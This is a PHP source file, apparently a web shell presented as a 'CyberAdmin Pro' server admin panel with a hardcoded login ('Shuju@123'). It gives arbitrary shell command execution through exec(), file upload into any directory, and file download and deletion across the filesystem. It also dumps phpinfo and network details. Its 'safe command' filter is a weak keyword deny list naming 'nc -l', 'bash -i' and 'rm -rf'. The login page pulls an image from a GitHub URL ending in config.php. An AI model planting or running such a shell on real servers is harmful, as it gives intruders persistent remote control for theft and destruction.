<?php
session_start();
ob_start();

// ================= CONFIGURATION =================
$CONFIG = [
    'password' => 'Shuju@123', // CHANGE THIS
    'username' => 'Shuju',           // CHANGE THIS
    'session_timeout' => 3600,
    'base_directory' => '/var/www/html',
    'allowed_ips' => [], // Add IPs like ['192.168.1.100'] for restriction
    'log_actions' => true,
    'max_upload_size' => 100 * 1024 * 1024 // 100MB
];
// =================================================

// Security & Authentication Functions
function checkAuth() {
    global $CONFIG;
    
    // IP Whitelisting
    if (!empty($CONFIG['allowed_ips']) && !in_array($_SERVER['REMOTE_ADDR'], $CONFIG['allowed_ips'])) {
        logAction("BLOCKED_IP_ACCESS", $_SERVER['REMOTE_ADDR']);
        return false;
    }
    
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        if (time() - $_SESSION['login_time'] > $CONFIG['session_timeout']) {
            session_destroy();
            logAction("SESSION_TIMEOUT", $_SESSION['username']);
            return false;
        }
        // Update session time on activity
        $_SESSION['last_activity'] = time();
        return true;
    }
    return false;
}

function logAction($action, $details = '') {
    global $CONFIG;
    if (!$CONFIG['log_actions']) return;
    
    $log = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | $action | $details\n";
    file_put_contents('admin_actions.log', $log, FILE_APPEND | LOCK_EX);
}

function sanitizeInput($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

function isSafeCommand($command) {
    $dangerous = ['rm -rf', 'mkfs', 'dd', 'chmod 777', 'passwd', '> /dev', 'nc -l', 'bash -i'];
    foreach ($dangerous as $cmd) {
        if (stripos($command, $cmd) !== false) return false;
    }
    return true;
}

// Authentication Check
if (!checkAuth()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $CONFIG['username'] && $_POST['password'] === $CONFIG['password']) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['last_activity'] = time();
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['client_ip'] = $_SERVER['REMOTE_ADDR'];
            logAction("LOGIN_SUCCESS", $_POST['username']);
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            logAction("LOGIN_FAILED", $_POST['username']);
            $error = "Invalid credentials!";
        }
    }
    
    // Show Login Page - FIXED FUNCTION
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔐 Secure Admin Portal</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .login-container {
                background: rgba(30, 30, 30, 0.95);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
                border: 1px solid #333;
                width: 100%;
                max-width: 400px;
                backdrop-filter: blur(10px);
            }
            .logo {
                text-align: center;
                margin-bottom: 30px;
            }
            .logo img {
                max-width: 120px;
                border-radius: 10px;
                margin-bottom: 15px;
            }
            .logo h1 {
                color: #00ff88;
                font-size: 24px;
                font-weight: 300;
                letter-spacing: 2px;
            }
            .form-group { margin-bottom: 20px; }
            label { 
                display: block; 
                color: #ccc; 
                margin-bottom: 8px;
                font-size: 14px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 12px 15px;
                background: rgba(255, 255, 255, 0.1);
                border: 1px solid #444;
                border-radius: 8px;
                color: #fff;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            input[type="text"]:focus, input[type="password"]:focus {
                outline: none;
                border-color: #00ff88;
                box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
            }
            .login-btn {
                width: 100%;
                background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%);
                color: #000;
                border: none;
                padding: 14px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
            }
            .error {
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid #ff4444;
                color: #ff6b6b;
                padding: 12px;
                border-radius: 6px;
                margin-bottom: 20px;
                text-align: center;
            }
            .security-notice {
                text-align: center;
                color: #666;
                font-size: 12px;
                margin-top: 20px;
                border-top: 1px solid #333;
                padding-top: 15px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <img src="https://raw.githubusercontent.com/ozawa8059-sys/asdasd/main/config.php" alt="Security Shield" onerror="this.style.display='none'">
                <h1>SECURE PORTAL</h1>
            </div>
            <?php if (isset($error)): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            <form method="post">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" required autocomplete="off">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required autocomplete="off">
                </div>
                <button type="submit" class="login-btn">Access System</button>
            </form>
            <div class="security-notice">
                🔒 Authorized Access Only • Activity Logged
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Handle Logout
if (isset($_GET['logout'])) {
    logAction("LOGOUT", $_SESSION['username']);
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Core Functions
function executeCommand($command) {
    if (!isSafeCommand($command)) {
        return [
            'output' => "Error: Command not allowed for security reasons",
            'return_code' => 1,
            'command' => $command
        ];
    }
    
    $output = [];
    $return_var = 0;
    exec($command . " 2>&1", $output, $return_var);
    return [
        'output' => implode("\n", $output),
        'return_code' => $return_var,
        'command' => $command
    ];
}

function getSystemInfo() {
    $info = [];
    
    // System
    $info['os'] = php_uname();
    $info['server'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['php_version'] = phpversion();
    
    // Memory
    $info['memory_usage'] = memory_get_usage(true);
    $info['memory_peak'] = memory_get_peak_usage(true);
    
    // Disk
    $info['disk_free'] = disk_free_space("/");
    $info['disk_total'] = disk_total_space("/");
    
    // Load average
    if (function_exists('sys_getloadavg')) {
        $info['load_avg'] = sys_getloadavg();
    }
    
    return $info;
}

function browseDirectory($path = '.') {
    $files = [];
    if (!is_dir($path)) return $files;
    
    $items = scandir($path);
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $fullPath = $path . '/' . $item;
        $files[] = [
            'name' => $item,
            'path' => $fullPath,
            'type' => is_dir($fullPath) ? 'directory' : 'file',
            'size' => is_file($fullPath) ? filesize($fullPath) : null,
            'permissions' => substr(sprintf('%o', fileperms($fullPath)), -4),
            'modified' => filemtime($fullPath),
            'is_readable' => is_readable($fullPath),
            'is_writable' => is_writable($fullPath)
        ];
    }
    
    return $files;
}

// Process Actions
$result = [];
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if ($current_dir === false) $current_dir = getcwd();

if ($_POST) {
    $action = key($_POST);
    
    switch ($action) {
        case 'command':
            $cmd = sanitizeInput($_POST['command']);
            $result = executeCommand($cmd);
            logAction("COMMAND_EXEC", $cmd);
            break;
            
        case 'download':
            $file = realpath($_POST['file_path']);
            if ($file && file_exists($file) && is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                logAction("FILE_DOWNLOAD", $file);
                exit;
            }
            break;
            
        case 'delete_file':
            $file = realpath($_POST['file_path']);
            if ($file && file_exists($file) && is_writable($file)) {
                if (is_dir($file)) {
                    rmdir($file);
                } else {
                    unlink($file);
                }
                $result = ['success' => 'File deleted successfully'];
                logAction("FILE_DELETE", $file);
            }
            break;
    }
}

if (isset($_FILES['upload_file'])) {
    $upload = $_FILES['upload_file'];
    if ($upload['error'] === UPLOAD_ERR_OK) {
        $target = $current_dir . '/' . basename($upload['name']);
        if (move_uploaded_file($upload['tmp_name'], $target)) {
            $result = ['success' => 'File uploaded successfully'];
            logAction("FILE_UPLOAD", $target);
        }
    }
}

// Get current system data
$system_info = getSystemInfo();
$directory_files = browseDirectory($current_dir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberAdmin Pro</title>
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #0099ff;
            --danger: #ff4444;
            --warning: #ffaa00;
            --dark: #0a0a0a;
            --darker: #050505;
            --light: #1a1a1a;
            --lighter: #2a2a2a;
            --text: #ffffff;
            --text-secondary: #cccccc;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--dark);
            color: var(--text);
            line-height: 1.6;
        }
        
        .header {
            background: var(--darker);
            border-bottom: 2px solid var(--primary);
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo img {
            width: 40px;
            height: 40px;
            border-radius: 8px;
        }
        
        .logo h1 {
            color: var(--primary);
            font-size: 24px;
            font-weight: 300;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
            color: var(--text-secondary);
        }
        
        .logout-btn {
            background: var(--danger);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            font-size: 14px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: var(--light);
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid var(--primary);
        }
        
        .stat-card h3 {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stat-value {
            color: var(--primary);
            font-size: 24px;
            font-weight: bold;
        }
        
        .tabs {
            display: flex;
            background: var(--light);
            border-radius: 10px 10px 0 0;
            overflow-x: auto;
        }
        
        .tab {
            padding: 15px 25px;
            background: transparent;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            border-bottom: 3px solid transparent;
        }
        
        .tab:hover {
            background: var(--lighter);
            color: var(--text);
        }
        
        .tab.active {
            background: var(--lighter);
            color: var(--primary);
            border-bottom-color: var(--primary);
        }
        
        .tab-content {
            display: none;
            background: var(--light);
            padding: 25px;
            border-radius: 0 0 10px 10px;
            margin-bottom: 30px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .command-form {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .command-input {
            flex: 1;
            background: var(--darker);
            border: 1px solid #333;
            color: var(--text);
            padding: 12px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            background: var(--primary);
            color: var(--dark);
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
        }
        
        .output {
            background: var(--darker);
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
        }
        
        .file-item {
            background: var(--lighter);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #333;
            transition: all 0.3s ease;
        }
        
        .file-item:hover {
            border-color: var(--primary);
            transform: translateY(-2px);
        }
        
        .file-icon {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .file-name {
            font-weight: 600;
            margin-bottom: 5px;
            word-break: break-all;
        }
        
        .file-info {
            font-size: 12px;
            color: var(--text-secondary);
        }
        
        .file-actions {
            margin-top: 10px;
            display: flex;
            gap: 5px;
        }
        
        .btn-small {
            padding: 5px 10px;
            font-size: 12px;
            background: #333;
            color: var(--text);
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        
        .terminal {
            background: #000;
            color: #0f0;
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            height: 400px;
            overflow-y: auto;
        }
        
        .alert {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .alert-success {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid var(--primary);
            color: var(--primary);
        }
        
        .alert-error {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid var(--danger);
            color: var(--danger);
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <img src="https://shuju.to/assets/logo.png" alt="CyberAdmin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iOCIgZmlsbD0iIzAwZmY4OCIvPgo8cGF0aCBkPSJNMTAgMTVIMzBWMTguNUgzMi41VjI1SDMwVjI4LjVIMTNWMjVIMTAuNVYxOC41SDEzVjE1WiIgZmlsbD0iIzBhMGEwYSIvPgo8L3N2Zz4K'">
                <h1>CYBERADMIN PRO</h1>
            </div>
            <div class="user-info">
                <span>Welcome, <?php echo $_SESSION['username']; ?></span>
                <span>IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></span>
                <a href="?logout=1" class="logout-btn">Logout</a>
            </div>
        </div>
    </div>

    <div class="container">
        <!-- Statistics -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>System Uptime</h3>
                <div class="stat-value"><?php echo executeCommand('uptime')['output'] ?? 'N/A'; ?></div>
            </div>
            <div class="stat-card">
                <h3>Memory Usage</h3>
                <div class="stat-value">
                    <?php 
                    $mem = $system_info['memory_usage'];
                    echo round($mem / 1024 / 1024, 2) . ' MB'; 
                    ?>
                </div>
            </div>
            <div class="stat-card">
                <h3>Disk Space</h3>
                <div class="stat-value">
                    <?php
                    $free = $system_info['disk_free'];
                    $total = $system_info['disk_total'];
                    $used = $total - $free;
                    echo round($used / 1024 / 1024 / 1024, 1) . ' GB / ' . round($total / 1024 / 1024 / 1024, 1) . ' GB';
                    ?>
                </div>
            </div>
            <div class="stat-card">
                <h3>PHP Version</h3>
                <div class="stat-value"><?php echo $system_info['php_version']; ?></div>
            </div>
        </div>

        <!-- Tabs Navigation -->
        <div class="tabs">
            <button class="tab active" onclick="switchTab('dashboard')">📊 Dashboard</button>
            <button class="tab" onclick="switchTab('terminal')">💻 Terminal</button>
            <button class="tab" onclick="switchTab('filemanager')">📁 File Manager</button>
            <button class="tab" onclick="switchTab('database')">🗃️ Database</button>
            <button class="tab" onclick="switchTab('network')">🌐 Network</button>
            <button class="tab" onclick="switchTab('security')">🛡️ Security</button>
            <button class="tab" onclick="switchTab('phpinfo')">🐘 PHP Info</button>
            <button class="tab" onclick="switchTab('logs')">📋 Logs</button>
        </div>

        <!-- Dashboard Tab -->
        <div id="dashboard" class="tab-content active">
            <h2>System Overview</h2>
            <div class="output">
<?php
echo "OS: " . $system_info['os'] . "\n";
echo "Server: " . $system_info['server'] . "\n";
echo "PHP Version: " . $system_info['php_version'] . "\n";
echo "Memory Usage: " . round($system_info['memory_usage'] / 1024 / 1024, 2) . " MB\n";
echo "Memory Peak: " . round($system_info['memory_peak'] / 1024 / 1024, 2) . " MB\n";
if (isset($system_info['load_avg'])) {
    echo "Load Average: " . implode(", ", $system_info['load_avg']) . "\n";
}
?>
            </div>
        </div>

        <!-- Terminal Tab -->
        <div id="terminal" class="tab-content">
            <h2>Command Terminal</h2>
            <form method="post" class="command-form">
                <input type="text" name="command" class="command-input" placeholder="Enter command..." required>
                <button type="submit" class="btn">Execute</button>
            </form>
            <?php if (isset($result['output'])): ?>
                <div class="output">
                    <strong>Command:</strong> <?php echo sanitizeInput($result['command']); ?>\n
                    <strong>Return Code:</strong> <?php echo $result['return_code']; ?>\n
                    <strong>Output:</strong>\n<?php echo sanitizeInput($result['output']); ?>
                </div>
            <?php endif; ?>
        </div>

        <!-- File Manager Tab -->
        <div id="filemanager" class="tab-content">
            <h2>File Manager - <?php echo $current_dir; ?></h2>
            
            <!-- File Upload -->
            <div style="margin-bottom: 20px; padding: 15px; background: var(--lighter); border-radius: 5px;">
                <h3>Upload File</h3>
                <form method="post" enctype="multipart/form-data" style="display: flex; gap: 10px;">
                    <input type="file" name="upload_file" required>
                    <button type="submit" class="btn">Upload</button>
                </form>
            </div>

            <!-- File List -->
            <div class="file-grid">
                <?php foreach ($directory_files as $file): ?>
                    <div class="file-item">
                        <div class="file-icon">
                            <?php echo $file['type'] === 'directory' ? '📁' : '📄'; ?>
                        </div>
                        <div class="file-name"><?php echo sanitizeInput($file['name']); ?></div>
                        <div class="file-info">
                            Size: <?php echo $file['size'] ? number_format($file['size']) . ' bytes' : 'DIR'; ?><br>
                            Perms: <?php echo $file['permissions']; ?><br>
                            Modified: <?php echo date('Y-m-d H:i', $file['modified']); ?>
                        </div>
                        <div class="file-actions">
                            <?php if ($file['type'] === 'file' && $file['is_readable']): ?>
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="file_path" value="<?php echo $file['path']; ?>">
                                    <button type="submit" name="download" class="btn-small">Download</button>
                                </form>
                            <?php endif; ?>
                            <?php if ($file['is_writable']): ?>
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="file_path" value="<?php echo $file['path']; ?>">
                                    <button type="submit" name="delete_file" class="btn-small" onclick="return confirm('Delete this file?')">Delete</button>
                                </form>
                            <?php endif; ?>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Database Tab -->
        <div id="database" class="tab-content">
            <h2>Database Management</h2>
            <div class="output">
                Database functionality can be extended with specific database credentials and operations.
                This would typically include:
                - Database connection testing
                - Query execution
                - Table browsing
                - Backup creation
            </div>
        </div>

        <!-- Network Tab -->
        <div id="network" class="tab-content">
            <h2>Network Tools</h2>
            <div class="output">
<?php
echo "Network Information:\n";
echo executeCommand('ifconfig')['output'] . "\n";
echo "\nNetwork Connections:\n";
echo executeCommand('netstat -tuln')['output'];
?>
            </div>
        </div>

        <!-- Security Tab -->
        <div id="security" class="tab-content">
            <h2>Security Scanner</h2>
            <div class="output">
                Security scanning features would include:
                - File integrity checking
                - Permission auditing
                - Suspicious file detection
                - Log analysis
            </div>
        </div>

        <!-- PHP Info Tab -->
        <div id="phpinfo" class="tab-content">
            <h2>PHP Configuration</h2>
            <div class="output">
<?php
ob_start();
phpinfo();
$phpinfo = ob_get_clean();
echo $phpinfo;
?>
            </div>
        </div>

        <!-- Logs Tab -->
        <div id="logs" class="tab-content">
            <h2>Activity Logs</h2>
            <div class="output">
<?php
if (file_exists('admin_actions.log')) {
    echo file_get_contents('admin_actions.log');
} else {
    echo "No logs found.";
}
?>
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        // Auto-refresh stats every 30 seconds
        setInterval(() => {
            // Could implement AJAX refresh here
        }, 30000);

        // Terminal-like input focus
        document.querySelector('.command-input')?.focus();
    </script>
</body>
</html>
<?php
ob_end_flush();
?>
